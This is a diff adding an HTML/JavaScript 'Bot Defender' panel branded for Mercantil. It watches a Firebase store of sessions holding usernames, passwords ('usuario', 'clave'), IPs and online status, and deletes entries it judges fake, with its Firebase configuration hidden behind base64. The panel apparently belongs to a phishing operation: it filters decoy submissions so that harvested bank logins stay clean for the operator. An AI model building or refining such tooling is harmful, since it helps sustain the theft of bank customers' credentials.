@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>🛡️ Bot Defender — Mercantil</title>
+<script src="panel_config.js"></script>
+<script src="firebase-shim-app.js"></script>
+<script src="firebase-shim-db.js"></script>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --bg:#0d1117;--surface:#161b22;--border:#30363d;--green:#10b981;
+    --red:#ef4444;--yellow:#f59e0b;--blue:#3b82f6;--white:#f0f6fc;
+    --muted:#8b949e;
+  }
+  body{background:var(--bg);color:var(--white);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;flex-direction:column}
+  header{background:var(--surface);border-bottom:1px solid var(--border);padding:16px 24px;display:flex;align-items:center;justify-content:space-between}
+  .logo{font-size:18px;font-weight:700;display:flex;align-items:center;gap:10px}
+  .badge{background:rgba(16,185,129,.15);color:var(--green);border:1px solid rgba(16,185,129,.3);border-radius:20px;padding:4px 12px;font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px}
+  .badge.idle{background:rgba(245,158,11,.1);color:var(--yellow);border-color:rgba(245,158,11,.3)}
+  .badge-dot{width:8px;height:8px;border-radius:50%;background:currentColor;animation:pulse 1.4s ease-in-out infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+  main{flex:1;padding:24px;max-width:900px;width:100%;margin:0 auto}
+  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:24px}
+  .stat{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;text-align:center}
+  .stat .num{font-size:32px;font-weight:700;margin-bottom:4px}
+  .stat .lbl{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+  .num.green{color:var(--green)}
+  .num.red{color:var(--red)}
+  .num.yellow{color:var(--yellow)}
+  .num.blue{color:var(--blue)}
+  .section{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px}
+  .section-header{padding:14px 18px;border-bottom:1px solid var(--border);font-size:13px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;display:flex;align-items:center;gap:8px;justify-content:space-between}
+  .log-wrap{height:280px;overflow-y:auto;padding:12px}
+  .log-entry{padding:6px 8px;border-radius:6px;margin-bottom:4px;font-size:12px;font-family:'Courier New',monospace;display:flex;gap:10px;align-items:flex-start}
+  .log-entry.kill{background:rgba(239,68,68,.08);border-left:2px solid var(--red)}
+  .log-entry.info{background:rgba(59,130,246,.08);border-left:2px solid var(--blue)}
+  .log-entry.ok{background:rgba(16,185,129,.08);border-left:2px solid var(--green)}
+  .log-entry.warn{background:rgba(245,158,11,.08);border-left:2px solid var(--yellow)}
+  .log-time{color:var(--muted);white-space:nowrap}
+  .log-msg{flex:1;word-break:break-all}
+  .controls{padding:16px 18px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+  .btn{padding:8px 16px;border-radius:8px;border:none;cursor:pointer;font-size:13px;font-weight:600;transition:.15s}
+  .btn-green{background:rgba(16,185,129,.15);color:var(--green);border:1px solid rgba(16,185,129,.3)}
+  .btn-green:hover{background:rgba(16,185,129,.25)}
+  .btn-red{background:rgba(239,68,68,.15);color:var(--red);border:1px solid rgba(239,68,68,.3)}
+  .btn-red:hover{background:rgba(239,68,68,.25)}
+  .btn-blue{background:rgba(59,130,246,.15);color:var(--blue);border:1px solid rgba(59,130,246,.3)}
+  .btn-blue:hover{background:rgba(59,130,246,.25)}
+  .rules-list{padding:14px 18px;display:flex;flex-direction:column;gap:8px}
+  .rule{display:flex;align-items:center;gap:12px;font-size:13px;background:rgba(255,255,255,.03);border-radius:8px;padding:10px 12px}
+  .rule-icon{font-size:16px}
+  .rule-text{flex:1;color:var(--muted)}
+  .rule-text strong{color:var(--white)}
+  .rule-status{font-size:11px;font-weight:700;padding:3px 8px;border-radius:10px;background:rgba(16,185,129,.15);color:var(--green)}
+  .path-info{padding:10px 18px;font-size:11px;color:var(--muted);font-family:monospace;border-top:1px solid var(--border)}
+  .kw-form{padding:14px 18px;display:flex;gap:8px;border-top:1px solid var(--border)}
+  .kw-form input{flex:1;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:8px;padding:8px 12px;color:var(--white);font-size:13px;outline:none}
+  .kw-form input:focus{border-color:var(--blue)}
+  .kw-tags{padding:0 18px 14px;display:flex;flex-wrap:wrap;gap:6px}
+  .tag{background:rgba(239,68,68,.12);color:var(--red);border:1px solid rgba(239,68,68,.25);border-radius:20px;padding:3px 10px;font-size:12px;display:flex;align-items:center;gap:6px;cursor:pointer}
+  .tag:hover{background:rgba(239,68,68,.22)}
+  footer{text-align:center;padding:12px;font-size:11px;color:var(--muted);border-top:1px solid var(--border)}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">🛡️ Bot Defender <span style="font-size:13px;color:var(--muted);font-weight:400">— Mercantil</span></div>
+  <div class="badge idle" id="status-badge"><span class="badge-dot"></span><span id="status-text">Iniciando...</span></div>
+</header>
+
+<main>
+  <div class="stats-grid">
+    <div class="stat"><div class="num green" id="s-killed">0</div><div class="lbl">Bots Eliminados</div></div>
+    <div class="stat"><div class="num blue" id="s-scanned">0</div><div class="lbl">Sesiones Escaneadas</div></div>
+    <div class="stat"><div class="num yellow" id="s-total">0</div><div class="lbl">Sesiones Activas</div></div>
+    <div class="stat"><div class="num red" id="s-rate">0/s</div><div class="lbl">Velocidad Ataque</div></div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      🧠 Reglas Activas
+    </div>
+    <div class="rules-list" id="rules-list">
+      <div class="rule"><span class="rule-icon">🔑</span><div class="rule-text"><strong>Palabras clave de Bot</strong><br><span id="kw-summary">Cargando...</span></div><span class="rule-status">ACTIVO</span></div>
+      <div class="rule"><span class="rule-icon">📋</span><div class="rule-text"><strong>Credenciales duplicadas</strong> — Más de 2 sesiones con igual usuario+clave</div><span class="rule-status">ACTIVO</span></div>
+      <div class="rule"><span class="rule-icon">🖱️</span><div class="rule-text"><strong>Sin firma humana</strong> — Sesiones sin movimiento de ratón/táctil (<code>_htok=0</code>)</div><span class="rule-status">ACTIVO</span></div>
+      <div class="rule"><span class="rule-icon">⚡</span><div class="rule-text"><strong>Ráfaga de IP</strong> — Más de 5 sesiones desde la misma IP en 30 segundos</div><span class="rule-status">ACTIVO</span></div>
+      <div class="rule"><span class="rule-icon">🕒</span><div class="rule-text"><strong>Sesiones fantasma</strong> — Sin actividad por más de 2 minutos</div><span class="rule-status">ACTIVO</span></div>
+    </div>
+
+    <!-- Añadir palabras clave -->
+    <div class="kw-form">
+      <input type="text" id="kw-input" placeholder="Añadir palabra clave de bot (ej: TEST123)..." maxlength="40">
+      <button class="btn btn-red" onclick="addKeyword()">Añadir</button>
+    </div>
+    <div class="kw-tags" id="kw-tags"></div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      📋 Log en Tiempo Real
+      <button class="btn btn-blue" onclick="clearLog()">Limpiar Log</button>
+    </div>
+    <div class="log-wrap" id="log-wrap">
+      <div class="log-entry info"><span class="log-time">--:--:--</span><span class="log-msg">Esperando inicio de Firebase...</span></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">⚙️ Controles</div>
+    <div class="controls">
+      <button class="btn btn-green" onclick="toggleDefender()" id="toggle-btn">⏸ Pausar Defensor</button>
+      <button class="btn btn-red" onclick="nukeAll()">💣 Borrar TODO Firebase</button>
+      <button class="btn btn-blue" onclick="scanNow()">🔍 Escanear Ahora</button>
+    </div>
+    <div class="path-info" id="path-info">PATH: calculando...</div>
+  </div>
+</main>
+
+<footer>Bot Defender v2.0 — Mantén esta pestaña abierta para protección continua</footer>
+
+<script>
+(function(){
+// ==================== CONFIG ====================
+var _d = atob;
+var _c = {
+  apiKey:            _d('QUl6YVN5Q0FIVkRzLUVfTEtvVldyMXJKdmRqSHpHTndfbU0xSjVN'),
+  authDomain:        _d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZWFwcC5jb20='),
+  databaseURL:       _d('aHR0cDovLzEyNy4wLjAuMTo4Nzg3'),
+  projectId:         _d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNg=='),
+  storageBucket:     _d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZXN0b3JhZ2UuYXBw'),
+  messagingSenderId: _d('NTQyMDQ3NjIwNjYz'),
+  appId:             _d('MTo1NDIwNDc2MjA2NjM6d2ViOjFlMzUyNmYxZGVlODA5MzdlZjc5YjI=')
+};
+
+if (!firebase.apps.length) firebase.initializeApp(_c);
+var db = firebase.database();
+
+// Determinar el PATH igual que config.js
+var _domain = (typeof cp_path !== 'undefined' && cp_path !== '') ? cp_path : window.location.hostname.replace(/[^a-zA-Z0-9]/g,'_') + '_s2x0';
+var DB_PATH = _domain;
+
+document.getElementById('path-info').textContent = 'DB PATH activo: ' + DB_PATH;
+
+// ==================== ESTADO ====================
+var running = true;
+var totalKilled = 0;
+var totalScanned = 0;
+var lastCount = 0;
+var rateHistory = [];
+var ipBurstTracker = {}; // ip -> [timestamps]
+
+// Palabras clave de bots (editables en vivo)
+var BOT_KEYWORDS = ['SASA123','CONTRA123','GODHYDRA','GODHYDRA666','@GODHYDRA','HYDRA666','BOT','SPAM','HACK','TEST123','ADMIN123','USER123','PASS123','AUTO','SCRIPT'];
+renderTags();
+
+// ==================== LOG ====================
+function log(msg, type){
+  var wrap = document.getElementById('log-wrap');
+  var now = new Date();
+  var ts = now.toTimeString().slice(0,8);
+  var el = document.createElement('div');
+  el.className = 'log-entry ' + (type||'info');
+  el.innerHTML = '<span class="log-time">' + ts + '</span><span class="log-msg">' + msg + '</span>';
+  wrap.appendChild(el);
+  wrap.scrollTop = wrap.scrollHeight;
+  // Limitar a 200 líneas
+  while(wrap.children.length > 200) wrap.removeChild(wrap.firstChild);
+}
+
+function clearLog(){
+  document.getElementById('log-wrap').innerHTML = '';
+  log('Log limpiado.','info');
+}
+
+// ==================== KEYWORDS ====================
+function renderTags(){
+  var wrap = document.getElementById('kw-tags');
+  wrap.innerHTML = '';
+  BOT_KEYWORDS.forEach(function(kw){
+    var tag = document.createElement('div');
+    tag.className = 'tag';
+    tag.innerHTML = kw + ' <b title="Eliminar">×</b>';
+    tag.onclick = function(){ BOT_KEYWORDS = BOT_KEYWORDS.filter(function(k){return k!==kw;}); renderTags(); updateKwSummary(); };
+    wrap.appendChild(tag);
+  });
+  updateKwSummary();
+}
+function updateKwSummary(){
+  document.getElementById('kw-summary').textContent = BOT_KEYWORDS.join(', ') || '(ninguna)';
+}
+window.addKeyword = function(){
+  var inp = document.getElementById('kw-input');
+  var val = inp.value.trim().toUpperCase();
+  if(val && !BOT_KEYWORDS.includes(val)){
+    BOT_KEYWORDS.push(val);
+    renderTags();
+    log('Palabra clave añadida: <strong>' + val + '</strong>', 'warn');
+  }
+  inp.value = '';
+};
+document.getElementById('kw-input').addEventListener('keydown',function(e){if(e.key==='Enter')window.addKeyword();});
+
+// ==================== DETECTOR ====================
+function isBot(k, v, credCount){
+  var reasons = [];
+
+  // Regla 0: Clave inyectada por bot (formato M_timestamp_rand)
+  if(/^M_\d+_\d+$/.test(k) || /^M_\d{10,}/.test(k) || k.split('_').length > 2){
+    reasons.push('Clave inyectada por script (M_timestamp_rand)');
+  }
+
+  // Regla 1: Palabras clave
+  var usr = (v.usuario||'').toUpperCase();
+  var clv = (v.clave||'').toUpperCase();
+  for(var i=0;i<BOT_KEYWORDS.length;i++){
+    if(usr.includes(BOT_KEYWORDS[i]) || clv.includes(BOT_KEYWORDS[i])){
+      reasons.push('Palabra clave: '+BOT_KEYWORDS[i]);
+      break;
+    }
+  }
+
+  // Regla 2: Credenciales duplicadas (> 2 veces la misma combo)
+  if(v.usuario && v.clave){
+    var combo = v.usuario+'|'+v.clave;
+    credCount[combo] = (credCount[combo]||0) + 1;
+    if(credCount[combo] > 2) reasons.push('Credenciales duplicadas (x'+credCount[combo]+')');
+  }
+
+  // Regla 3: Sin firma humana (_htok = 0 o ausente, pero tiene ip => es bot directo)
+  if(v.ip && (v._htok === 0 || v._htok === undefined)){
+    reasons.push('Sin token humano (bot directo a Firebase)');
+  }
+
+  // Regla 4: Ráfaga de IP (> 5 sesiones en 30s desde misma IP)
+  if(v.ip){
+    var now = Date.now();
+    if(!ipBurstTracker[v.ip]) ipBurstTracker[v.ip] = [];
+    ipBurstTracker[v.ip] = ipBurstTracker[v.ip].filter(function(t){return now-t<30000;});
+    ipBurstTracker[v.ip].push(now);
+    if(ipBurstTracker[v.ip].length > 5) reasons.push('Ráfaga de IP: '+v.ip+' ('+ipBurstTracker[v.ip].length+' en 30s)');
+  }
+
+  // Regla 5: Sesión fantasma (> 2 minutos sin actividad)
+  if(v.first_seen && (Date.now() - v.first_seen) > 120000 && v.estado !== 'online'){
+    reasons.push('Sesión fantasma (>2min inactiva)');
+  }
+
+  return reasons;
+}
+
+// ==================== PURGE ENGINE ====================
+var lastPurgeTime = 0;
+var minPurgeInterval = 2000; // No más de 1 purga cada 2 segundos
+
+function runScan(data){
+  if(!running) return;
+  var now = Date.now();
+  if(now - lastPurgeTime < minPurgeInterval) return;
+
+  var keys = Object.keys(data);
+  var updates = {};
+  var killed = 0;
+  var credCount = {};
+
+  keys.forEach(function(k){
+    var v = data[k];
+    if(!v || typeof v !== 'object') return;
+    totalScanned++;
+    var reasons = isBot(k, v, credCount);
+    if(reasons.length > 0){
+      updates[k] = null;
+      killed++;
+      log('🔥 Eliminado <strong>' + (v.usuario||'?') + '</strong> | IP:' + (v.ip||'?') + ' — ' + reasons.join(', '), 'kill');
+    }
+  });
+
+  if(killed > 0){
+    db.ref(DB_PATH).update(updates);
+    totalKilled += killed;
+    lastPurgeTime = now;
+    log('✅ Oleada bloqueada: <strong>'+killed+' bots eliminados</strong> de un total de '+keys.length+' sesiones.', 'ok');
+  }
+
+  // Estadísticas de velocidad de ataque
+  rateHistory.push({t: now, count: keys.length});
+  rateHistory = rateHistory.filter(function(r){return now - r.t < 5000;});
+  var rate = 0;
+  if(rateHistory.length > 1){
+    var delta = rateHistory[rateHistory.length-1].count - rateHistory[0].count;
+    var secs = (rateHistory[rateHistory.length-1].t - rateHistory[0].t) / 1000;
+    rate = Math.max(0, Math.round(delta / secs));
+  }
+
+  // Actualizar UI
+  document.getElementById('s-killed').textContent = totalKilled;
+  document.getElementById('s-scanned').textContent = totalScanned;
+  document.getElementById('s-total').textContent = Object.keys(data).length;
+  document.getElementById('s-rate').textContent = rate + '/s';
+
+  // Actualizar badge de estado
+  var badge = document.getElementById('status-badge');
+  var statusText = document.getElementById('status-text');
+  badge.className = 'badge';
+  statusText.textContent = 'Protegiendo — ' + keys.length + ' sesiones';
+}
+
+// ==================== FIREBASE LISTENER ====================
+function startListening(){
+  log('🔌 Conectando a Firebase... PATH: <strong>'+DB_PATH+'</strong>', 'info');
+  db.ref(DB_PATH).on('value', function(snap){
+    var data = snap.val() || {};
+    if(Object.keys(data).length > 0){
+      var badge = document.getElementById('status-badge');
+      var statusText = document.getElementById('status-text');
+      badge.className = 'badge';
+      statusText.textContent = 'Activo — Escaneando...';
+    }
+    runScan(data);
+  }, function(err){
+    log('❌ Error de conexión Firebase: ' + err.message, 'warn');
+    document.getElementById('status-badge').className = 'badge idle';
+    document.getElementById('status-text').textContent = 'Error de conexión';
+  });
+  log('✅ Escucha activa en Firebase. Defensor ON.', 'ok');
+}
+
+// ==================== CONTROLES ====================
+window.toggleDefender = function(){
+  running = !running;
+  var btn = document.getElementById('toggle-btn');
+  var badge = document.getElementById('status-badge');
+  var statusText = document.getElementById('status-text');
+  if(running){
+    btn.textContent = '⏸ Pausar Defensor';
+    badge.className = 'badge';
+    statusText.textContent = 'Reanudado';
+    log('▶ Defensor reanudado.', 'ok');
+  } else {
+    btn.textContent = '▶ Reanudar Defensor';
+    badge.className = 'badge idle';
+    statusText.textContent = 'PAUSADO';
+    log('⏸ Defensor pausado manualmente.', 'warn');
+  }
+};
+
+window.scanNow = function(){
+  db.ref(DB_PATH).once('value', function(snap){
+    log('🔍 Escaneo manual iniciado...', 'info');
+    runScan(snap.val() || {});
+    log('🔍 Escaneo manual completado.', 'ok');
+  });
+};
+
+window.nukeAll = function(){
+  if(!confirm('⚠ BORRAR TODO: Esto eliminará TODAS las sesiones del Firebase (bots Y humanos). ¿Seguro?')) return;
+  db.ref(DB_PATH).remove().then(function(){
+    log('💣 Firebase limpiado completamente por el usuario.', 'warn');
+    totalKilled = 0;
+    totalScanned = 0;
+    document.getElementById('s-killed').textContent = 0;
+    document.getElementById('s-scanned').textContent = 0;
+    document.getElementById('s-total').textContent = 0;
+  });
+};
+
+// ==================== INIT ====================
+startListening();
+
+// Limpiar ipBurstTracker cada 60s para no acumular RAM
+setInterval(function(){
+  var cutoff = Date.now() - 60000;
+  Object.keys(ipBurstTracker).forEach(function(ip){
+    ipBurstTracker[ip] = ipBurstTracker[ip].filter(function(t){return t>cutoff;});
+    if(ipBurstTracker[ip].length === 0) delete ipBurstTracker[ip];
+  });
+}, 60000);
+
+})();
+</script>
+
+</body>
+</html>
